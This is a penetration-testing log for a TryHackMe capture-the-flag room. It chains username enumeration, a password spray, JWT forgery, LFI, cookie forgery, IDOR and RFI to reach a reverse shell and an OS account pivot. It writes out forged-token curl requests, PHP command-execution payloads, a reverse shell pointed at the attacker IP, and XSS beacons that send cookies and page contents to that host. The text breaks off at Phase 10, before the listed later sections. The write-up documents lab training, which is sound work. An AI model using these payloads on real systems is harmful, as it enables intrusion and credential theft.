# Security Investigation: Domino

## Table of Contents

- [1. Investigation Overview](#1-investigation-overview)
- [2. Current Investigation Status](#2-current-investigation-status)
- [3. Scope and Environment](#3-scope-and-environment)
- [4. Investigation Log](#4-investigation-log)
  - [Phase 1: Reconnaissance](#phase-1-reconnaissance)
  - [Phase 2: Reconnaissance and Triage — Username Enumeration and Password Reuse](#phase-2-reconnaissance-and-triage--username-enumeration-and-password-reuse)
  - [Phase 3: Mapping the Authenticated Attack Surface](#phase-3-mapping-the-authenticated-attack-surface)
  - [Phase 4: Investigation — Breaking the JWT](#phase-4-investigation--breaking-the-jwt)
  - [Phase 5: Investigation — From File Read to Full Source Disclosure](#phase-5-investigation--from-file-read-to-full-source-disclosure)
  - [Phase 6: Investigation — Hardcoded Secrets and the Pivot to Admin Impersonation](#phase-6-investigation--hardcoded-secrets-and-the-pivot-to-admin-impersonation)
  - [Phase 7: A Finding Independent of the Above — IDOR](#phase-7-a-finding-independent-of-the-above--idor)
  - [Phase 8: Exploitation — From File Read to Remote Code Execution](#phase-8-exploitation--from-file-read-to-remote-code-execution)
  - [Phase 9: Rabbit Hole — Misdiagnosing the Ticket-Review Mechanism](#phase-9-rabbit-hole--misdiagnosing-the-ticket-review-mechanism)
  - [Phase 10: Lateral Movement — From Web Shell to a Real OS Account](#phase-10-lateral-movement--from-web-shell-to-a-real-os-account)
  - [Phase 11: Privilege Escalation — From a Fully Mapped Path to Root](#phase-11-privilege-escalation--from-a-fully-mapped-path-to-root)
- [5. Vulnerability Candidates](#5-vulnerability-candidates)
- [6. Confirmed Vulnerabilities](#6-confirmed-vulnerabilities)
- [7. Rabbit Holes and Disproven Hypotheses](#7-rabbit-holes-and-disproven-hypotheses)
- [8. Evidence and Artifacts](#8-evidence-and-artifacts)
- [9. Technical Knowledge and Lessons Learned](#9-technical-knowledge-and-lessons-learned)
- [10. Final Investigation Summary](#10-final-investigation-summary)
- [11. Writeup Handoff](#11-writeup-handoff)

## 1. Investigation Overview

- Target / Challenge: Domino — NexusCorp Employee Portal (TryHackMe, Jr Penetration Tester path)
- Platform / Program: TryHackMe
- Investigation Type: CTF
- Scope: Target web app (PHP/Apache, ports 80/22) as provisioned by the TryHackMe room; attacker and target IPs changed across VPN reconnects during the engagement (see Section 3 for the specific IPs used)
- Restrictions: Authorized TryHackMe lab target only; no destructive testing; no out-of-scope infrastructure
- Start Date: 2026-10-29 (engagement spanned at least two sessions)
- Status: Completed — full chain from zero credentials to `root`
- Primary Objective: Obtain `user.txt` and `root.txt`

## 2. Current Investigation Status

### Summary

This room was worked across two recorded sessions, producing two sets of raw notes with different target/attacker IPs (VPN reconnects reassign the target IP in THM, and the attacker reconnected mid-engagement too; see Section 3). Both sessions reached full `root` compromise via the same underlying web-app chain and the same final privilege-escalation primitive. This investigation file synthesizes both into one record, with full verbatim commands/output captured inline per phase (Section 4) rather than left in separate session-notes files.

### Confirmed Findings

See Section 6 (Confirmed Vulnerabilities) for the full chain: username enumeration → password reuse → JWT signature bypass → LFI/source disclosure → hardcoded secrets → session forgery (admin impersonation) → IDOR (independent finding) → RFI → RCE → credential reuse (OS pivot) → cron-triggered root compromise.

### Flags Captured

| # | Flag (redacted) | How it was obtained | Phase |
| --- | --- | --- | --- |
| 1 | `THM{REDACTED}` | `notes` field on `/api/users/profile.php?id=1`, via the IDOR, as a plain low-privilege `robert.wilson` session | Phase 7 |
| 2 | `THM{REDACTED}` | Source of `admin/index.php`, read via the Phase 5 LFI primitive once the admin cookie forged in Phase 6 exposed the `/admin/index.php` link | Phase 6 |
| 3 | `THM{REDACTED}` | `/opt/flag3.txt`, read immediately after landing a shell via the RFI → RCE chain | Phase 8 |
| 4 | `THM{REDACTED}` | `/home/devops/user.txt`, after `su devops` using the reused `DB_PASS` credential | Phase 10 |
| root | `THM{REDACTED}` | `/root/root.txt`, after the reverse shell appended to `health_report.sh` fired on its root-crontab-triggered 60-second execution window | Phase 11 |

### Active Hypotheses

None remaining open at completion; see Section 7 for the one privilege-escalation avenue (`admin_bot.py` / `admin-bot.service`) that was investigated but never completed, superseded by the path that worked.

### Open Questions

- Whether the `devops` OS credential (reused from `DB_PASS`) also works over actual SSH — never tested; access was via web-shell → `su`.
- `files.php`'s own PHP source was never pulled, so the exact RFI mechanism (`include()` + `allow_url_include`, vs. download-then-execute) was inferred from behavior, not confirmed from source.
- The `reset_tokens` logic flaw noted in a `forgot.php` comment ("token NOT bound to requesting user") was never chased to a working exploit.
- Whether the `admin_bot.py` SSRF primitive can reach other `localhost`-only services beyond what was already enumerated via direct shell access.

### Next Steps

None — room completed. Open questions above are candidates for a follow-up pass if the room is revisited.

## 3. Scope and Environment

### Authorized Targets

TryHackMe-provisioned target for the Domino room (PHP/Apache web app on port 80, SSH on 22). The target's own IP changed across VPN reconnects: `10.49.184.182` (session 1, recon through the cookie-forgery/admin-impersonation chain) and `10.49.179.121` (session 1 continued / session 2, from the RFI onward through root).

### Restrictions

Authorized TryHackMe lab target only, accessed via THM VPN/AttackBox. No destructive testing.

### Environment

Two sessions, each with its own attacker IP (VPN-assigned): `10.48.122.251` (initial recon through the JWT/LFI/cookie-forgery chain), then `10.49.124.24`, then `10.49.120.226` (RFI/reverse-shell phase onward, Phase 8+). The "Our Team" page and the application's own source review were the primary sources of information; no external OSINT was applicable to an internal lab target.

### Initial Information

The "Our Team" public page discloses 7 full names, roles, departments, and emails, revealing the `firstname.lastname@nexus.corp` username convention and converting a blind credential-guessing problem into a targeted one against 7 known accounts.

## 4. Investigation Log

### Phase 1: Reconnaissance

#### Objective

Map the exposed attack surface.

#### Observations

`nmap -sV -sC` showed only two ports: 22 (SSH) and 80 (Apache/PHP). SSH never yielded usable credentials during this engagement; the web app (`index.php` entrypoint) was the sole attack surface. The public "Our Team" page lists all 7 employees with full names, roles, and departments, confirming the `firstname.lastname` username pattern.

#### Actions and Experiments

```bash
nmap -sV -sC 10.49.179.121
```

Manual browse of the login page and the "Our Team" page (see embedded screenshots below).

#### Results

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

Only two ports open; the web app (`index.php` entrypoint) is the sole attack surface. The "Our Team" page lists all 7 employees by full name, role, and department, directly revealing the `firstname.lastname@nexus.corp` convention: 7 valid usernames identified without any guessing.

#### Analysis

A single page converts the engagement from "guess a username and password" to "7 known usernames, find the weak one(s)."

#### Findings

Username enumeration surface via the public team page.

#### Evidence

![NexusCorp Employee Portal login page](evidence/images/login.png)

![NexusCorp "Our Team" page listing all 7 employees](evidence/images/our-team-page.png)

#### Next Steps

Look for a server-side oracle that confirms which usernames are real accounts, then attempt credential attacks.

### Phase 2: Reconnaissance and Triage — Username Enumeration and Password Reuse

#### Objective

Turn the 7 known names into a low-privilege authenticated foothold.

#### Observations

The login form itself returns a generic "Invalid credentials" message regardless of username validity. The password-reset flow at `/forgot.php`, however, returns a different message for a known vs. unknown username ("No account found..." vs. "Password reset instructions have been sent to ...") — a classic enumeration oracle, with no CSRF token and no observed rate limiting.

#### Hypotheses

A weak, shared password might be reused across some of the 7 accounts, given the enumeration oracle removes the cost of guessing usernames.

#### Actions and Experiments

Probed the enumeration oracle first:

```
POST /forgot.php  username=nobody.here
→ "No account found with that username."

POST /forgot.php  username=laura.hayes
→ "Password reset instructions have been sent to la****@nexus.corp"
```

Then a password-spray via Hydra against the confirmed username list using a top-1000 common-password wordlist:

```bash
hydra -L usernames.txt -P 10-million-password-list-top-1000.txt 10.49.179.121 \
  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -t 4
```

#### Results

The oracle confirmed account existence distinctly from unknown usernames (shown above). Hydra result: 3 of 7 accounts (`sarah.johnson`, `robert.wilson`, `emma.taylor`) shared the literal password `password`. The CISO, Lead Security Engineer, Full-Stack Developer, and SysAdmin accounts did not fall to this list.

#### Analysis

Only the less security-focused roles reused a trivially weak password — a pattern worth noting for the eventual remediation writeup (credential hygiene correlates with role awareness here, not a technical control).

#### Findings

Confirmed: username enumeration via `/forgot.php` (CWE-203); confirmed: password reuse / weak shared credential across 3 accounts (CWE-521).

#### Evidence

Enumeration-oracle requests and the Hydra command/result are captured inline above (this phase).

#### Next Steps

Log in as one of the compromised accounts and map the authenticated attack surface.

### Phase 3: Mapping the Authenticated Attack Surface

#### Objective

Understand what a low-privilege (`role: user`) session can reach.

#### Observations

Logged in as `emma.taylor`. The dashboard exposes: My Profile, a File Viewer at `/api/files.php?name=` ("Access internal documents via the secure file API"), JWT auth at `/api/auth/token.php`, and links to Support Tickets / Open Ticket / the Profile API.

#### Findings

Three distinct features worth testing independently: the JWT-gated File Viewer, the ticket system, and the Profile API.

#### Evidence

![Dashboard after logging in as emma.taylor](evidence/images/emma-taylor-dashboard.png)

![Support Tickets page](evidence/images/support-tickets.png)

![Open Ticket page](evidence/images/open-ticket.png)

#### Next Steps

Investigate the JWT mechanism gating the File Viewer.

### Phase 4: Investigation — Breaking the JWT

#### Objective

Determine whether the File Viewer's JWT-based role gate can be bypassed.

#### Observations

`/api/auth/token.php` issues a JWT whose header and payload are base64url-encoded (not encrypted); decoding locally showed a `role` claim directly in the payload. Requesting `/api/files.php` with a legitimate non-admin JWT returned `403 Admin JWT required`, confirming the endpoint gates specifically on the `role` claim.

#### Hypotheses

If the server doesn't actually verify the HMAC signature on the way back in, the `role` claim can be edited client-side without needing the signing secret.

#### Actions and Experiments

Decoded the issued JWT locally, no secret needed:

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo -n "eyJzdWIiOiJlbW1hLnRheWxvciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzMTExMDgwLCJleHAiOjE3OTMxMTQ2ODB9" | base64 -d
# {"sub":"emma.taylor","role":"user","iat":1793111080,"exp":1793114680}
```

Confirmed the endpoint gates on `role` with a legitimate non-admin token first:

```bash
curl -s "http://10.49.179.121/api/files.php?name=robert" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTMxMTE2MjAsImV4cCI6MTc5MzExNTIyMH0.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc" -v
```

Then changed the payload's `role` to `admin`, re-encoded it, and reattached it to the original (now-mismatched) signature, unchanged:

```bash
curl -s "http://10.49.179.121/api/files.php?name=robert" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc" -v
```

#### Results

Legitimate non-admin token:

```
< HTTP/1.1 403 Forbidden
< Content-Type: application/json
<
{"error":"Admin JWT required. Check your token payload."}
```

Tampered admin-role token, mismatched signature:

```
< HTTP/1.1 403 Forbidden
< Content-Type: application/json
<
{"error":"Access denied: path must be within \/var\/www\/html\/"}
```

Accepted. A different error surfaced, confirming not only that the signature isn't checked, but that the `name=` parameter now reaches a filesystem-path-building code path once the admin gate is passed.

#### Analysis

Source disclosure later (Phase 5) confirmed the root cause directly: `verify_jwt()`'s entire signature-comparison block is commented out; only token expiry is checked. A secondary bug in `generate_jwt()` always issues `role: 'user'` regardless of the account's real DB role, meaning even a legitimate admin login wouldn't normally receive an admin-role JWT — making client-side forgery the only practical way to obtain one at all.

#### Findings

Confirmed: JWT signature verification disabled (CWE-347) — any authenticated user of any role can mint themselves an "admin" JWT.

#### Evidence

JWT decode and the baseline/forged-token requests and results are captured inline above (this phase).

#### Next Steps

Use the forged admin JWT to explore what `/api/files.php` actually does with the `name` parameter.

### Phase 5: Investigation — From File Read to Full Source Disclosure

#### Objective

Determine the scope of the file-read primitive unlocked by the forged JWT.

#### Observations

With the forged admin-role JWT, `?name=robert` returned `"Access denied: path must be within /var/www/html/"`, confirming path concatenation. Direct traversal toward `/etc/passwd` was correctly blocked by what behaves like `realpath()`-based normalization — not trivially bypassable for escaping the web root. Requesting an in-bounds file (`?name=index.php`) succeeded and revealed the actual working directory is one level deeper (`/var/www/html/api/`) than the error message implies.

#### Hypotheses

A single relative `../` would reach sibling files one level up while still passing the "within /var/www/html/" check, since that directory is itself inside the permitted root.

#### Actions and Experiments

First fingerprinted the working directory with a known in-bounds file:

```bash
curl -s "http://10.49.179.121/api/files.php?name=index.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

Then requested `?name=../forgot.php`, `?name=../auth.php`, with the same admin-forged JWT.

#### Results

```json
{"file":"\/var\/www\/html\/api\/index.php","content":"  "}
```

This revealed the actual working directory is `/var/www/html/api/`, one level deeper than the error message implies, so a single `../` reaches sibling files that still pass the "within /var/www/html/" check.

```bash
curl -s "http://10.49.179.121/api/files.php?name=../forgot.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```
```json
{"file":"\/var\/www\/html\/forgot.php","content":"<?php\n ... "}
```

```bash
curl -s "http://10.49.179.121/api/files.php?name=../auth.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```
```json
{"file":"\/var\/www\/html\/auth.php","content":"<?php\n ... "}
```

Both succeeded, disclosing full PHP source for `forgot.php` and `auth.php` (full content saved in `evidence/sources/`; the JSON wrapper's `content` field is truncated above since the real decoded source is already preserved as the saved `.php` files).

#### Analysis

This is a textbook containment check built for local traversal that doesn't account for the API's own directory depth relative to the assumed root. `auth.php`'s source directly confirmed the disabled signature check from Phase 4, and `auth.php` itself `require_once`s `config.php` — the next, more consequential target.

#### Findings

Confirmed: Local File Inclusion / path traversal (partially mitigated) (CWE-22) — full source disclosure for files one directory above the API root.

#### Evidence

- `investigations/TryHackMe/domino/evidence/sources/forgot.php`
- `investigations/TryHackMe/domino/evidence/sources/auth.php`
- `investigations/TryHackMe/domino/evidence/sources/config.php`

#### Remaining Questions

A dev comment in `forgot.php` flags a separate logic flaw ("token NOT bound to requesting user") — not chased further.

#### Next Steps

Read `config.php` for secrets.

### Phase 6: Investigation — Hardcoded Secrets and the Pivot to Admin Impersonation

#### Objective

Assess the impact of the secrets found in `config.php`.

#### Observations

`config.php` hardcodes `DB_PASS`, `JWT_SECRET`, and `APP_SECRET`. `DB_PASS`/`JWT_SECRET` relate to the already-broken JWT path. `APP_SECRET`, however, signs a separate, independently well-implemented mechanism found by reading `auth.php`: the `nexus_session` cookie (HMAC-verified with `hash_equals()`, role always re-fetched from the DB rather than trusted from the cookie).

#### Hypotheses

A valid `nexus_session` cookie can be forged for any `user_id` using the leaked `APP_SECRET`, since the scheme is otherwise sound but depends entirely on that one secret staying secret.

#### Actions and Experiments

Read `config.php` through the same LFI:

```bash
curl -s "http://10.49.179.121/api/files.php?name=../config.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

```json
{"file":"\/var\/www\/html\/config.php","content":"<?php\n ... "}
```

(Full decoded source saved to `evidence/sources/config.php`.)

Forged a `nexus_session` cookie for `user_id=1` (the CISO) using a small script replicating the app's HMAC-SHA256 hex-digest scheme (saved to `evidence/scripts/generate-cookie.py`, embedded below), and sent it to `/dashboard.php`:

```python
import hmac, hashlib, base64, json

secret = "nexus_app_k3y_2024"
user_id = 1

payload = base64.b64encode(json.dumps({"user_id": user_id}).encode()).decode()
sig = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
cookie = f"{payload}.{sig}"

print(cookie)
```

```bash
curl -s http://10.49.179.121/dashboard.php -H "Cookie: nexus_session=eyJ1c2VyX2lkIjogMX0=.18774129655cf93459b228dfb1d4f0bedc37ab6e685747136c1da9c8104d6459" -v
```

#### Results

```
*   Trying 10.49.179.121:80...
* Connected to 10.49.179.121 (10.49.179.121) port 80
> GET /dashboard.php HTTP/1.1
> Host: 10.49.179.121
> Cookie: nexus_session=eyJ1c2VyX2lkIjogMX0=.18774129655cf93459b228dfb1d4f0bedc37ab6e685747136c1da9c8104d6459
>
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
<
<h1>Welcome, laura.hayes</h1>
...
<p><strong>Role:</strong> admin</p>
...
<a href="/admin/index.php">Admin</a>
...
<li><a href="/api/users/profile.php?id=1">My Profile API</a></li>
```

`200 OK`, rendered dashboard as the CISO, `Role: admin`, with an `Admin` nav link not shown to regular users. Following it confirmed full administrative access on the live application.

#### Analysis

This cookie scheme is sound in isolation; it is exploitable only as a downstream consequence of the secret leaking through the Phase 5 file-read primitive. Note for reproduction: `generate_jwt()` and `get_session()` encode their HMACs differently (raw-bytes-then-base64 vs. hex digest) — a forgery script has to match the hex-digest form for the cookie specifically.

Following the newly-exposed `Admin` nav link landed on `/admin/index.php` (the Administration Console, screenshot below). With the same `files.php?name=` LFI primitive from Phase 5 still available and an admin-role JWT in hand, we pulled that page's own PHP source the same way we'd pulled `forgot.php`/`auth.php`/`config.php`, and saved it to `evidence/sources/admin.index.php`. Its source contains a comment and a constant that amount to a second flag, sitting in the admin page itself rather than behind any further exploitation:

```php
// FLAG 2 is stored here
$flag2 = 'THM{REDACTED}';
```

rendered on the page inside a `flag-box` div ("Internal reference: `<?= $flag2 ?>`"). **Flag captured.**

#### Findings

Confirmed: hardcoded secrets in source (CWE-798); confirmed: session cookie forgery → full administrative impersonation (CWE-290). **Flag captured** from `admin/index.php`'s own source, reached via the forged admin cookie and read via the Phase 5 LFI primitive (redacted; see evidence): `THM{REDACTED}`.

#### Evidence

- `evidence/sources/config.php` (disclosed from the target)
- `evidence/scripts/generate-cookie.py` (written by us, embedded above)
- `evidence/sources/admin.index.php` (disclosed from the target; contains flag 2, redacted in this document)

![Forged nexus_session cookie accepted by dashboard.php, inspected via browser DevTools](evidence/images/admin-dashboard.png)

![Administration Console at /admin/index.php, logged in as laura.hayes](evidence/images/admin-console.png)

#### Next Steps

Explore what else the newly-forged admin session reaches.

### Phase 7: A Finding Independent of the Above — IDOR

#### Objective

Check for object-level authorization gaps, independent of the admin-impersonation chain.

#### Observations

While authenticated as `robert.wilson` via a completely ordinary password login (role: `user`, no forged cookie or JWT involved), requesting `/api/users/profile.php?id=1` returned the CISO's full profile record, including a `notes` field not shown to her in her own UI.

#### Actions and Experiments

```
GET /api/users/profile.php?id=1
(session: robert.wilson, role: user — plain password login, no forged cookie/JWT)
```

#### Results

Confirmed: no ownership or role check on this endpoint at all. **Flag captured** (redacted; see evidence image, which shows the flag in-frame): `THM{[REDACTED]}`.

#### Analysis

This is reachable by the lowest-privilege account compromised in Phase 2 alone — none of the JWT/LFI/secrets/cookie-forgery chain (Phases 4–6) is a prerequisite. Worth keeping as a separate finding in the writeup rather than folding it into the admin-impersonation narrative, since conflating the two would overstate the admin chain's necessity.

#### Findings

Confirmed: IDOR / horizontal privilege escalation (CWE-639) on `/api/users/profile.php?id=`.

#### Evidence

![/api/users/profile.php?id=1 returning laura.hayes's full record](evidence/images/admin-profile.png)

*(Note: this screenshot shows the flag text in-frame, unredacted; it predates this redaction workflow.)*

#### Next Steps

Return to the admin-session chain and look for a path to code execution.

### Phase 8: Exploitation — From File Read to Remote Code Execution

#### Objective

Determine whether the `/api/files.php?name=` primitive extends beyond local file reads.

#### Observations

The Phase 5 containment check assumes a local filesystem path; it has no defined behavior for a fully-qualified remote URL, which `realpath()`-style normalization cannot resolve at all.

#### Hypotheses

The endpoint might fetch (and possibly execute) a remote URL passed via `name=`, turning a file-read feature into SSRF or RCE.

#### Actions and Experiments

1. Hosted an innocuous static file and probed with it:

```bash
python3 -m http.server 8000   # attacker box, serving index.html
```
```bash
curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/index.html" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

2. Followed with a differentiating PHP payload to distinguish "fetched and displayed" from "fetched and executed":

```php
<?php echo "RCE-TEST-" . (1337*2); ?>
```
```bash
curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/exploit.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

3. Escalated to a direct OS command, since some hardened builds disable `system()`/`exec()` individually:

```php
<?php system('id'); ?>
```
```bash
curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/exploit.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

#### Results

1. Listener log:

```
10.49.179.121 - - [29/Oct/2026 14:23:39] "GET /index.html HTTP/1.1" 200 -
```

The containment check does not block remote URLs.

2. 

```json
{ "output": "RCE-TEST-2674" }
```

The arithmetic evaluated server-side, and the response's JSON key changed to `"output"` (distinct from the `"file"`/`"content"` shape used for local reads) — confirmed code execution via a dedicated remote-URL code path, not a file read.

3. 

```json
{ "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" }
```

Confirmed OS command execution as `www-data`.

Escalated to an interactive shell: started a Penelope listener, parameterized a standard PentestMonkey PHP reverse shell with `sed`, and delivered it through the same RFI primitive.

```bash
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 10.49.120.226
```

```bash
sed -i "s/\$ip = '127.0.0.1';/\$ip = '10.49.86.77';/" /usr/share/webshells/php/php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" /usr/share/webshells/php/php-reverse-shell.php

sed -i "s/\$ip = '10.49.86.77';/\$ip = '10.49.120.226';/" /usr/share/webshells/php/php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" /usr/share/webshells/php/php-reverse-shell.php

curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/php-reverse-shell.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzM2NjE5MiwiZXhwIjoxNzkzMzY5NzkyfQ.JW9ZpXPq+hcnSSiPh9HIYiOV835llJStXjWp/McvxzA"
```

```bash
listening on [any] 4444 ...
connect to [10.49.120.226] from (UNKNOWN) [10.49.179.121] 39894
Linux tryhackme-2404 6.17.0-1015-aws #15~24.04.1-Ubuntu SMP Thu May 7 17:00:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

Note: the full modified `php-reverse-shell.php` was never saved as its own evidence file; the `sed` commands above and the connection log are the actual captured record of what was run. The shell was later re-established through Penelope for a more stable, fully-interactive session, used for the remainder of the engagement.

```bash
$ cat /opt/flag3.txt
THM{[REDACTED]}
```

#### Analysis

A path-containment check designed for local traversal does not generalize to URLs — this is a distinct root cause from the LFI in Phase 5, reachable through the same parameter and the same admin-JWT gate.

#### Findings

Confirmed: Remote File Inclusion (RFI) → Remote Code Execution (CWE-98). **Flag captured** on first shell access from `/opt/flag3.txt` (redacted): `THM{[REDACTED]}`.

#### Evidence

RFI probe requests and the shell-access transcript are captured inline above (this phase).

![Attacker HTTP server hosting the RFI payloads](evidence/images/http-server.png)

![Listener and file server set up before the retry](evidence/images/reverse-shell-setup.png)

#### Remaining Questions

`files.php`'s own PHP source was never pulled — would have definitively confirmed whether the remote-URL branch uses `include()`+`allow_url_include` or a separate download-then-execute mechanism.

#### Next Steps

Enumerate from the `www-data` shell for a path to a real OS account.

### Phase 9: Rabbit Hole — Misdiagnosing the Ticket-Review Mechanism

#### Objective

Determine the mechanism behind a suspected "admin reviews tickets" feature noted in the dashboard.

#### Observations

`support/create.php`'s source (pulled via the Phase 5 LFI) contains a comment indicating ticket messages are stored raw, with no XSS filtering.

#### Hypotheses

Initial hypothesis: a headless-browser-driven blind XSS against an admin's live session.

#### Actions and Experiments

Submitted a `<script>` payload exfiltrating `document.cookie` via an image-beacon request:

```html
<script>
  new Image().src = 'http://10.49.120.226:8000/hit?c=' + document.cookie;
</script>
```

Then a `fetch()`-based payload attempting to read an authenticated page's content and exfiltrate it the same way:

```html
<script>
  fetch('/dashboard.php')
    .then((r) => r.text())
    .then(
      (d) =>
        (new Image().src =
          'http://10.49.120.226:8000/exfil?d=' + encodeURIComponent(d)),
    );
</script>
```

#### Results

First payload, listener log:

```
10.49.179.121 - - [29/Oct/2026 13:51:28] "GET /hit?c= HTTP/1.1" 404 -
```

The request fired, but `document.cookie` was always empty. The `fetch()` payload's exfiltrated content was also always empty, regardless of target path — including an always-populated, unauthenticated page.

#### Analysis

This was disproven once OS-level access (Phase 10) revealed the actual mechanism:

```python
# /opt/admin_bot.py (relevant excerpt)
def process(t):
    msg = t["message"]
    url_pat = r"https?://[A-Za-z0-9./_?&=:%+-]+"
    urls = re.findall(url_pat, msg)
    for url in set(urls):
        requests.get(url, cookies=COOKIE, timeout=5)
```

`/opt/admin_bot.py` is a plain Python daemon with no browser and no JavaScript execution at all. It regexes ticket `message` text for anything matching an `http(s)://` URL pattern and performs a blind, response-discarding `requests.get()` on it, using a hardcoded admin session cookie built the same way as the Phase 6 forgery. This fully explains the earlier results in hindsight: relative-path `fetch()` payloads never matched the URL regex (so `requests.get()` was never invoked for them), and the "hits" that did land were just the literal beacon URL in the raw ticket text being regex-extracted and GET'd verbatim, not real exfiltrated content.

#### Failed Attempts / Dead Ends

Both XSS-style payloads (cookie exfiltration, authenticated-fetch exfiltration) failed to demonstrate any actual script execution, because none was ever happening — the vulnerability is server-side SSRF via regex extraction, not client-side XSS.

#### Findings

Confirmed: SSRF via ticket-review automation (`admin_bot.py`) (CWE-918) — the process runs as `root` and issues authenticated-as-admin outbound requests, a blind SSRF primitive relevant to otherwise-unreachable `localhost`-only services (e.g. the DB).

#### Evidence

XSS-style test payloads are captured inline above (this phase); `evidence/sources/admin-bot.py`.

![XSS-style test payload submitted to the ticket system](evidence/images/xss-test.png)

#### Next Steps

Continue OS-level enumeration from the `www-data` shell.

### Phase 10: Lateral Movement — From Web Shell to a Real OS Account

#### Objective

Pivot from the `www-data` web shell to a real, interactive OS account.

#### Observations

Running `pspy64` (a non-root process monitor, uploaded to `/opt/tools`) surfaced a genuine local account, confirmed directly in `/etc/passwd`:

```bash
cat /etc/passwd
```
```
...
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
...
devops:x:1001:1001::/home/devops:/bin/bash
```

`devops` (UID 1001, `/bin/bash`) is distinct from the web app's `firstname.lastname` convention, matching a `/home/devops` directory already visible but inaccessible as `www-data`. The full startup-snapshot `pspy64` dump (every process seen at the moment it was launched, all sharing one identical timestamp) is saved in full to [`evidence/pspy64-startup-dump.txt`](evidence/pspy64-startup-dump.txt); the two lines that mattered from it are the long-running root-owned Python process (picked up in Phase 11) and confirmation that nothing beyond standard system processes was running.

#### Hypotheses

Given the engagement's established pattern of weak/reused credentials (Phase 2) and a database password literally named after the role it belongs to, that same `DB_PASS` value might also be the `devops` OS account's password.

#### Actions and Experiments

```bash
su devops
Password: D3v0ps!2024
```

#### Results

```
devops@tryhackme-2404:~$ whoami
devops
```

Succeeded.

```bash
devops@tryhackme-2404:~$ cat user.txt
THM{[REDACTED]}
```

**Flag captured** from `~/user.txt` (redacted).

#### Analysis

Confirms the engagement's password-reuse theme extends across the web app / database / operating-system trust boundaries, not just within the web app itself (Phase 2's finding was reuse between web accounts; this is reuse between a DB credential and a real OS account).

#### Findings

Confirmed: credential reuse — database password reused as OS account password (CWE-521).

#### Remaining Questions

